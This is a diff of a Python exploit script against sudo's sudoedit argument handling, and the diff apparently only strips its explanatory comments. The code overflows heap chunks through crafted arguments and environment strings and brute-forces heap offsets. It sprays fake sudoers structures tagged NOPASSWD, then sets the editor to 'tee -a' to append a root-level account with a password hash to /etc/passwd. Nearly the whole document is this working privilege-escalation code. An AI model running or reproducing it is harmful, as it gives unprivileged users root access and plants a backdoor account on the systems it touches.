@@ -7,7 +7,7 @@ import signal
 from struct import pack, unpack
 from ctypes import cdll, c_char_p, POINTER
 
-SUDO_PATH = b"/usr/bin/sudo"  # can be used in execve by passing argv[0] as "sudoedit"
+SUDO_PATH = b"/usr/bin/sudo" 
 
 TEE_PATH = b"/usr/bin/tee"
 PASSWD_PATH = b'/etc/passwd'
@@ -15,12 +15,11 @@ APPEND_CONTENT = b"gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/r
 
 DEBUG = False
 
-# fake defaults object for finding offsets
-# expect VSYSCALL permission is "r-x" on old Linux kernel
+
 VSYSCALL_ADDR = 0xffffffffff600000
 defaults_test_obj = [
 	b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # defaults.next
-	b"A"*8 + pack("<Q", VSYSCALL_ADDR+0x880) + # prev, var (use syscall for testing first)
+	b"A"*8 + pack("<Q", VSYSCALL_ADDR+0x880) + 
 	b"A"*0x20
 ]
 
@@ -37,7 +36,7 @@ def spawn_raw(filename, cargv, cenvp):
 	if pid:
 		# parent
 		_, exit_code = os.waitpid(pid, 0)
-		return exit_code & 0xff7f # remove coredump flag
+		return exit_code & 0xff7f 
 	else:
 		# child
 		execve(filename, cargv, cenvp)
@@ -46,7 +45,7 @@ def spawn_raw(filename, cargv, cenvp):
 def spawn(filename, argv, envp):
 	cargv = (c_char_p * len(argv))(*argv)
 	cenvp = (c_char_p * len(envp))(*envp)
-	# Note: error with backtrace is print to tty directly. cannot be piped or suppressd
+	
 	r, w = os.pipe()
 	pid = os.fork()
 	if not pid:
@@ -55,15 +54,13 @@ def spawn(filename, argv, envp):
 		os.dup2(w, 2)
 		execve(filename, cargv, cenvp)
 		exit(0)
-	# parent
+	
 	os.close(w)
-	# might occur deadlock in heap. kill it if timeout and set exit_code as 6
-	# 0.5 second should be enough for execution
+	
 	sr, _, _ = select.select([ r ], [], [], 0.5)
 	if sr or DEBUG:
 		_, exit_code = os.waitpid(pid, 0)
 	else:
-		# timeout, assume dead lock in heap
 		os.kill(pid, signal.SIGKILL)
 		_, exit_code = os.waitpid(pid, 0)
 		exit_code = 6
@@ -71,10 +68,9 @@ def spawn(filename, argv, envp):
 	r = os.fdopen(r, 'r')
 	err = r.read()
 	r.close()
-	return exit_code & 0xff7f, err  # remove coredump flag
+	return exit_code & 0xff7f, err  
 
 def has_askpass(err):
-	# 'sudoedit: no askpass program specified, try setting SUDO_ASKPASS'
 	return 'sudoedit: no askpass program ' in err
 
 def find_cmnd_size():
@@ -97,7 +93,6 @@ def find_cmnd_size():
 			if found_size:
 				found_size = curr_size
 				break
-			# maybe almost fit. try again
 			found_size = curr_size
 			size_min = curr_size
 			size_max = curr_size + 0x20
@@ -107,7 +102,6 @@ def find_cmnd_size():
 				break
 			size_max = curr_size
 		else:
-			# heap corruption. too small
 			size_min = curr_size
 
 	if found_size:
@@ -134,7 +128,7 @@ def find_cmnd_size():
 		assert found, "Cannot find cmnd size"
 		size_max = size_min + step
 	
-	# TODO: verify		
+	
 	return size_min
 
 def find_defaults_chunk(argv, env_prefix):
@@ -142,8 +136,6 @@ def find_defaults_chunk(argv, env_prefix):
 	pos = len(env_prefix) - 1
 	env = env_prefix[:]
 	env.extend([ b"LC_ALL=C", b"TZ=:", None ])
-	# overflow until sudo crash without asking pass
-	# crash because of defaults.entries.next is overwritten
 	while True:
 		env[pos] += b'A'*0x10
 		exit_code, err = spawn(SUDO_PATH, argv, env)
@@ -154,35 +146,26 @@ def find_defaults_chunk(argv, env_prefix):
 			break
 		offset += 0x10
 	
-	# new env_prefix
 	env_prefix = env[:-3]
 	
-	# tmp env_prefix for if it is defaults
 	env_prefix_def = env_prefix[:]
 	env_prefix_def[-1] += b'\x41\\'
 	env_prefix_def.extend([ b'\\', b'\\', b'\\', b'\\', b'\\', b'\\' ])
 	env_prefix_def.extend(defaults_test_obj)
 	
-	# verify if it is defaults
 	env = env_prefix_def[:]
-	env[-1] = env[-1][:-1] # remove 1 character. no overwrite next chunk with \x00
+	env[-1] = env[-1][:-1]
 	env.extend([ b"LC_ALL=C", b"TZ=:", None ])
 		
 	exit_code, err = spawn(SUDO_PATH, argv, env)
-	# old sudo verion has no cleanup if authen fail. exit code is 256.
 	if has_askpass(err):
 		assert exit_code in (256, 11)
-		#if exit_code == 256: no_cleanup = True  # old sudo version. no freeing if auth fails
-		# it is defaults
 		return True, offset, env_prefix_def
-	
-	# no defaults, this one is likely struct member.
-	# reset offset. very rare case.
+
 	env_prefix[-1] = env_prefix[-1][:-offset]
 	return False, 0, env_prefix
 
 def find_member_chunk(argv, env_prefix):
-	# expect username ("root") chunk size 0x20 then follow by struct member
 	offset = 0
 	pos = len(env_prefix) - 1
 	env = env_prefix[:]
@@ -213,20 +196,19 @@ def find_member_chunk(argv, env_prefix):
 def find_first_userspec_chunk(argv, env_prefix):
 	offset_member = find_member_chunk(argv, env_prefix)
 	
-	# after user member chunk, can safely skip 0x120 because of host, cmnd, cmndspec, privileges
 	SKIP_FIND_USERSPEC_SIZE = 0x120
 	offset_pre = offset_member + SKIP_FIND_USERSPEC_SIZE
 
 	pos = len(env_prefix) - 1
 	env = env_prefix[:]
-	env[-1] += b'A'*offset_pre + b'A'*7 + b'\\' # append chunk metadata
+	env[-1] += b'A'*offset_pre + b'A'*7 + b'\\'
 	tmp_env = env[-1]
 	env.extend([
-		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # next
+		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", 
 		b"A"*8 + # prev
-		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # users.first
+		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", 
 		b"A"*8 + # users.last
-		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"",  # privileges.first
+		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"",  
 		b"LC_ALL=C", b"TZ=:", None
 	])
 	
@@ -245,10 +227,7 @@ def _brute_userspec_offset(argv, env, pos, max_offset):
 	offset = None
 	for i in range(0, max_offset, 0x10):
 		exit_code, err = spawn(SUDO_PATH, argv, env)
-		#print("0x%x, exit: %d" % (i, exit_code))
-		#print(err)
 		if has_askpass(err):
-			# found. 256 for ver <= 1.8.10 (no cleanup callback. no crash)
 			assert exit_code in (6, 7, 11, 256), "unexpect exit code: %d" % exit_code
 			offset = i
 			if exit_code == 6:
@@ -265,32 +244,21 @@ def _brute_userspec_offset(argv, env, pos, max_offset):
 def _find_single_userspec_chunk(argv, env_prefix, offset_member=-1):
 	if offset_member == -1:
 		offset_member = find_member_chunk(argv, env_prefix)
-	
-	# finding offset of only one userspec needs bruteforcing a bit
-	# we need entires.prev pointing to a valid address that contains NULL pointer.
-	# search valid userspec by partial overwritten entries.prev
-	# Note: this offset search method is very bad if ASLR is disabled (likely to fail)
-	#   For quick testing: run this exploit with ASLR enabled for getting offset.
-	#   Then, disable ASLR and rerun exploit with offset arguments
 	print('cannot find a userspec. assume only 1 userspec (1 rule in sudoers).')
 	SKIP_FIND_USERSPEC_SIZE = 0x160
 	offset_pre = offset_member + SKIP_FIND_USERSPEC_SIZE
 
 	pos = len(env_prefix) - 1
 	env = env_prefix[:]
-	env[-1] += b'A'*offset_pre + b'A'*7 + b'\\' # append chunk metadata
+	env[-1] += b'A'*offset_pre + b'A'*7 + b'\\'
 	tmp_env = env[-1]
 	env.extend([
-		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # next
+		b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",
 		b"", b"",
 		b"LC_ALL=C", b"TZ=:", None
 	])
 	
-	# first, attempt with NULL least significant byte of prev
 	offset = _brute_userspec_offset(argv, env, pos, 0xc0)
-	# then, attempt with NULL 2nd least significant byte and bruteforcing least siginificat byte
-	# normally, valid offset should be found in 1 round
-	# if ASLR is disabed, 2nd round is useless because addresses are same as first round.
 	for _ in range(2):
 		if offset is not None:
 			break
@@ -307,15 +275,12 @@ def _find_single_userspec_chunk(argv, env_prefix, offset_member=-1):
 	print('offset of single userspec: 0x%x' % (offset+offset_pre))
 	return offset + offset_pre
 	
-
-# for running in sudoers case (asking password before crashed).
-# find a member object offset that belongs to a running user (find until crash without asking password).
 def find_target_userspec_chunk(argv, env_prefix):
 	pos = len(env_prefix) - 1
 	env = env_prefix[:]
 	env.extend([ b"LC_ALL=C", b"TZ=:", None ])
 	
-	# verify current userspec is usable or not
+
 	env[pos] += b'A'*0x10
 	exit_code, err = spawn(SUDO_PATH, argv, env)
 	if exit_code == 11 and not has_askpass(err):
@@ -325,7 +290,6 @@ def find_target_userspec_chunk(argv, env_prefix):
 	offset_skip = 0x180
 	env[pos] += b'A'*(offset_skip-0x10)
 	tmp_env = env[pos]
-	# overwrite until sudo crash without asking password
 	offset_max = None
 	for i in range(STEP, 0x1000, STEP):
 		env[pos] += b'A'*STEP
@@ -347,7 +311,6 @@ def find_target_userspec_chunk(argv, env_prefix):
 	for i in range(0x200, -1, -0x40):
 		env[pos] = tmp_env + b'A'*i + b'1234567\\'
 		exit_code, err = spawn(SUDO_PATH, argv, env)
-		#print("0x%x: %d" % (i, exit_code))
 		if has_askpass(err):
 			print('at range: 0x%x-0x%x' % (i-0x40, i+0x30))
 			found_base = i
@@ -404,21 +367,18 @@ def check_sudo_version():
 	return sudo_vers[2]
 
 def create_env(offset_defaults, offset_first_userspec, offset_userspec):
-	# offset_userspec
-	# - 0 if only first userspec is enough
-	# - -1 if only single userspec
 	with open('/proc/sys/kernel/randomize_va_space') as f: has_aslr = int(f.read()) != 0
 	if has_aslr:
 		STACK_ADDR_PAGE = 0x7fffe5d35000
 	else:
-		STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled
+		STACK_ADDR_PAGE = 0x7fffffff1000 
 
 	SA = STACK_ADDR_PAGE
 
-	ADDR_REFSTR = pack('<Q', SA+0x20) # ref string
+	ADDR_REFSTR = pack('<Q', SA+0x20)
 
 	ADDR_PRIV_PREV = pack('<Q', SA+0x10)
-	ADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec
+	ADDR_CMND_PREV = pack('<Q', SA+0x18) 
 	ADDR_MEMBER_PREV = pack('<Q', SA+0x20)
 	ADDR_USER_PREV = pack('<Q', SA+0x38)
 
@@ -432,82 +392,76 @@ def create_env(offset_defaults, offset_first_userspec, offset_userspec):
 	ADDR_PRIV = pack('<Q', SA+OFFSET+0x60+0x30+0x60)
 
 	epage = [
-		b'A'*0x8 + # to not ending with 0x00
-		
-		# fake def->var chunk (get freed)
+		b'A'*0x8 + 
 		b'\x21', b'', b'', b'', b'', b'', b'',
-		ADDR_PRIV[:6], b'',  # pointer to privilege
-		ADDR_CMND[:6], b'',  # pointer to cmndspec
-		ADDR_MEMBER[:6], b'',  # pointer to member
+		ADDR_PRIV[:6], b'', 
+		ADDR_CMND[:6], b'',  
+		ADDR_MEMBER[:6], b'',  
 		
-		# fake def->binding (list head) (get freed)
 		b'\x21', b'', b'', b'', b'', b'', b'',
-		b'', b'', b'', b'', b'', b'', b'', b'', # members.first
-		ADDR_USER[:6], b'', # members.last (unused, so use it for single userspec case)
-		b'A'*0x8 + # pad
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		ADDR_USER[:6], b'',
+		b'A'*0x8 + 
 		
-		# member chunk
-		b'\x31', b'', b'', b'', b'', b'', b'', # chunk size
-		b'A'*8 + # member.tqe_next (can be any)
-		ADDR_MEMBER_PREV[:6], b'', # member.tqe_prev
-		b'A'*8 + # member.name (can be any because this object is not freed)
-		pack('<H', MATCH_ALL), b'',  # type, negated
-		b'A'*0xc+ # padding
+		b'\x31', b'', b'', b'', b'', b'', b'', 
+		b'A'*8 + 
+		ADDR_MEMBER_PREV[:6], b'', 
+		b'A'*8 + 
+		pack('<H', MATCH_ALL), b'',  
+		b'A'*0xc+
 		
-		# userspec chunk (get freed)
-		b'\x61', b'', b'', b'', b'', b'', b'', # chunk metadata
-		b'', b'', b'', b'', b'', b'', b'', b'', # entries.tqe_next
-		b'A'*8 +  # entries.tqe_prev
-		b'', b'', b'', b'', b'', b'', b'', b'', # users.tqh_first
-		ADDR_MEMBER[:6]+b'', b'', # users.tqh_last
-		b'', b'', b'', b'', b'', b'', b'', b'', # privileges.tqh_first
-		ADDR_PRIV[:6]+b'', b'', # privileges.tqh_last
-		b'', b'', b'', b'', b'', b'', b'', b'', # comments.stqh_first
-		ADDR_MEMBER_PREV[:6], b'', # comments.stqh_last (can be any), file for <1.8.23
-		b'A'*8 + # lineno (can be any)
-		ADDR_MEMBER_PREV[:6], b'', # file (ref string)
-		b'A'*8 + # padding
+		b'\x61', b'', b'', b'', b'', b'', b'', 
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		b'A'*8 +  
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		ADDR_MEMBER[:6]+b'', b'',
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		ADDR_PRIV[:6]+b'', b'', 
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		ADDR_MEMBER_PREV[:6], b'', 
+		b'A'*8 + 
+		ADDR_MEMBER_PREV[:6], b'', 
+		b'A'*8 + 
 		
-		# cmndspec chunk
-		b'\x61', b'', b'', b'', b'', b'', b'', # chunk size
-		#b'\x61'*0x8 + # chunk metadata (need only prev_inuse flag)
-		b'A'*0x8 + # entries.tqe_next
-		ADDR_CMND_PREV[:6], b'',  # entries.teq_prev
-		b'', b'', b'', b'', b'', b'', b'', b'', # runasuserlist
-		b'', b'', b'', b'', b'', b'', b'', b'', # runasgrouplist
-		ADDR_MEMBER[:6], b'',  # cmnd
-		b'\xf9'+b'\xff'*7 + # tag (NOPASSWD), timeout
-		(b'' if sudo_ver < 20 else b'\xff'*0x10) + # notbefore, notafter
-		(b'\xff'*8 if sudo_ver == 20 else b'') + # timeout for version 1.8.20
-		b'', b'', b'', b'', b'', b'', b'', b'', # role
-		b'', b'', b'', b'', b'', b'', b'', b'', # type
-		(b'' if sudo_ver == 20 else b'A'*(0x18 if sudo_ver < 20 else 8)) + # padding
 		
-		# privileges chunk
-		b'\x51'*0x8 + # chunk metadata
-		b'A'*0x8 + # entries.tqe_next
-		ADDR_PRIV_PREV[:6], b'',  # entries.teq_prev
-		(b'A'*8 if has_ldap else b'') + # ldap_role
-		b'A'*8 + # hostlist.tqh_first
-		ADDR_MEMBER[:6], b'',  # hostlist.tqh_last
-		b'A'*8 + # cmndlist.tqh_first
-		ADDR_CMND[:6], b'',  # cmndlist.tqh_last
-		b'', b'', b'', b'', b'', b'', b'', b'', # defaults.tqh_first
+		b'\x61', b'', b'', b'', b'', b'', b'', 
+		b'A'*0x8 + 
+		ADDR_CMND_PREV[:6], b'',  
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		ADDR_MEMBER[:6], b'',  
+		b'\xf9'+b'\xff'*7 + 
+		(b'' if sudo_ver < 20 else b'\xff'*0x10) + 
+		(b'\xff'*8 if sudo_ver == 20 else b'') + 
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		b'', b'', b'', b'', b'', b'', b'', b'', 
+		(b'' if sudo_ver == 20 else b'A'*(0x18 if sudo_ver < 20 else 8)) + 
+		
+		
+		b'\x51'*0x8 + 
+		b'A'*0x8 + 
+		ADDR_PRIV_PREV[:6], b'',  
+		(b'A'*8 if has_ldap else b'') + 
+		b'A'*8 + 
+		ADDR_MEMBER[:6], b'',  
+		b'A'*8 + 
+		ADDR_CMND[:6], b'',  
+		b'', b'', b'', b'', b'', b'', b'', b'', 
 	]
 
 	env = [ b'A'*(0x401f+0x108) ]
 	if offset_defaults != -1:
 		env[-1] += b'A'*(offset_defaults) + b'\x41\\'
 		env.extend([
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # chunk metadata
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # next
-			b'a'*8 + # prev
-			ADDR_DEF_VAR[:6]+b'\\', b'\\', # var
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # val
-			ADDR_DEF_BINDING[:6]+b'\\', b'\\', # binding
-			ADDR_REFSTR[:6]+b'\\', b'\\',  # file
-			b"Z"*0x8+  # type, op, error, lineno
-			b'\x31\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # next
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',
+			b'a'*8 + 
+			ADDR_DEF_VAR[:6]+b'\\', b'\\', 
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
+			ADDR_DEF_BINDING[:6]+b'\\', b'\\', 
+			ADDR_REFSTR[:6]+b'\\', b'\\',  
+			b"Z"*0x8+  
+			b'\x31\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
 		])
 		offset_first_userspec -= 8
 	
@@ -517,51 +471,44 @@ def create_env(offset_defaults, offset_first_userspec, offset_userspec):
 		env.append(tmp)
 	else:
 		env[-1] += tmp
-	env.extend([ b'\\', b'\\', b'\\', b'\\', b'\\', b'\\' ]) # complete userspec chunk size
-
+	env.extend([ b'\\', b'\\', b'\\', b'\\', b'\\', b'\\' ]) 
 	if offset_userspec != 0:
 		env.extend([
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # entries.tqe_next
-			b"A"*8 + # entries.tqe_prev
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # users.tqh_first
-			b"A"*8 + # users.tqh_last
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # privileges.tqh_first
-			b"A"*8 # privileges.tqh_last
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',
+			b"A"*8 + 
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
+			b"A"*8 + 
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
+			b"A"*8 
 		])
-		if userspec_chunk_size == 0x60: # has comments
+		if userspec_chunk_size == 0x60: 
 			env[-1] += '\\'
 			env.extend([
-				b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # comments.tqh_first
-				b"A"*8 # comments.tqh_last
+				b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
+				b"A"*8 
 			])
 		if userspec_chunk_size >= 0x50:
 			env[-1] += b'A'*8 + ADDR_REFSTR[:6] + b'\\'
 			env.append(b'\\')
-			env.append(b'A'*8 + b'\x21\\')  # padding, chunk size
+			env.append(b'A'*8 + b'\x21\\')  
 		else:
-			env[-1] += b'A'*8 + b'\x21\\'  # padding, chunk size
+			env[-1] += b'A'*8 + b'\x21\\'  
 		env.extend([
-			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # need valid chunk metadata
+			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
 			b'A'*(offset_userspec-userspec_chunk_size-8+8-1)+b'\\'
 		])
 		
 	env.extend([
-		# userspec chunk
-		# for single userspec, sudo might pass checking and cause heap corruption when freeing
-		#   stack memory (with all zero). this case is slower than other cases.
-		# for >=2 userspecs, this chunk is not used because list is iterated with head->last->prev->next
-		ADDR_USER[:6]+b'\\', b'\\', # entries.tqe_next
-		ADDR_USER_PREV[:6]+b'\\', b'\\', # entries.tqe_prev
-		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # users.tqh_first
-		#ADDR_MEMBER[:6]+b'\\', b'\\', # users.tqh_last
-		b'A'*8 + # users.tqh_last
-		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'', # privileges.tqh_first
+		ADDR_USER[:6]+b'\\', b'\\', 
+		ADDR_USER_PREV[:6]+b'\\', b'\\', 
+		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', 
+		b'A'*8 + 
+		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'', 
 		b"LC_ALL=C",
-		b"SUDO_EDITOR="+TEE_PATH+b" -a", # append stdin to /etc/passwd
+		b"SUDO_EDITOR="+TEE_PATH+b" -a", 
 		b"TZ=:",
 	])
 	
-	# fill spray data
 	cnt = sum(map(len, epage))
 	padlen = 4096 - cnt - len(epage)
 	epage.append(b'P'*(padlen-1))
@@ -570,7 +517,6 @@ def create_env(offset_defaults, offset_first_userspec, offset_userspec):
 	for i in range(ENV_STACK_SIZE_MB * 1024 // 4):
 		env.extend(epage)
 
-	# reserve space in last element for '/usr/bin/sudo' and padding
 	env[-1] = env[-1][:-14-8]
 	env.append(None)
 
@@ -631,7 +577,6 @@ def main():
 		env_prefix.extend([ b'\\', b'\\', b'\\', b'\\', b'\\', b'\\' ])
 		env_prefix.extend(defaults_test_obj)
 
-	# first userspec offset MUST be known for cleaning up without a crash
 	if offset_first_userspec is None:
 		if has_fatal_cleanup:
 			offset, env_prefix, single_userspec = find_first_userspec_chunk(argv, env_prefix)
@@ -684,7 +629,7 @@ if __name__ == "__main__":
 		DEFAULTS_CMND = 268
 
 	has_fatal_cleanup = sudo_ver >= 11
-	has_file = sudo_ver >= 19  # has defaults.file pointer
+	has_file = sudo_ver >= 19  
 
 	has_ldap = sudo_ver >= 23
 	if sudo_ver < 19:
